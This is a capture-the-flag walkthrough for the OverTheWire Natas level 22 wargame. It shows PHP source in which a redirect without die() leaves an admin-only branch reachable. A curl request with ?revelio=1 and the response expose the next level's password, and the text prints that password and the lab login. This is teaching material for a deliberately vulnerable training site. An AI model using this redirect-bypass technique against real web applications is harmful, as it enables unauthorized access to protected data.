# Natas-22

# Source :

```php
<?
session_start();
if(array_key_exists("revelio", $_GET)) {
// only admins can reveal the password
				if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
				header("Location: /");
				}
}

if(array_key_exists("revelio", $_GET)) {

    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
}
?>
```

If there is a get request to the application with revelio parameter set and $_SESSION[”admin”] = 1
we will get the password . If $_SESSION[”admin”]=1 is not in our session file . we will be redirected to  / . But since its not using die() the next if(condition) will be executed and we can intercept that using burp or curl before the redirection occurs .

## Request

```php
curl -X GET [http://natas22.natas.labs.overthewire.org/?revelio=1](http://natas22.natas.labs.overthewire.org/?revelio=1) -u 'natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
```

## Response

```html
<body>
<h1>natas22</h1>
<div id="content">\
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

```
natas23 : D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```
